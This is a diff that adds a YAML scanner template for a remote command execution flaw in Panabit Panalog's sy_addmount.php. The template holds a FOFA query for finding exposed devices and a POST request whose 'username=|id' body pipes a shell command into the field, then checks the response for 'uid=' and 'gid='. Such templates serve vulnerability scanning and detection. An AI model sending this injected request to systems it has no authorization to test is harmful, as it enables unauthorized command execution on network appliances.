@@ -1,0 +1,21 @@
+id: panabit-log-rce
+
+info:
+  name: Panabit Panalog sy_ Addmount.php Remote Command Execution
+  author: ct
+  severity: high
+  verified: true
+  description: |
+    Panabit Panalog sy_addmount.php过滤不足，导致远程命令执行漏洞。
+    fofa: body="Maintain/cloud_index.php" || app="Panabit-Panalog"
+set:
+  hostname: request.url.host
+
+rules:
+  r0:
+    request:
+      method: POST
+      path: /account/sy_addmount.php
+      body: username=|id
+    expression: response.status == 200 && response.body.bcontains(b'uid=') && response.body.bcontains(b'gid=')
+expression: r0()
